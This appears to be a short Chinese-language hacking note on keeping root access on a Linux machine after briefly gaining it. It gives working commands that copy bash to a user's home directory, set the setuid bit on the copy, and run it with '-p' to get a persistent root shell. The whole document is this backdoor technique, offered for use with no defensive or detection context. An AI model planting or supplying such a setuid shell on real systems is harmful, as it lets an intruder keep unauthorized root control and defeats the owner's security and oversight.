# 保留root权限
在一台Linux机器上,拥有普通用户权限.如果短暂的获得了root身份,如何将获得的权限保留下来.
1. 赋予bash命令`s`权限
    ```bash
    # 以root身份运行
    cp -p $(readlink -f $(which bash)) /home/test/
    chmod u+s /home/test/bash
    ```
2. 运行`./bash -p`即可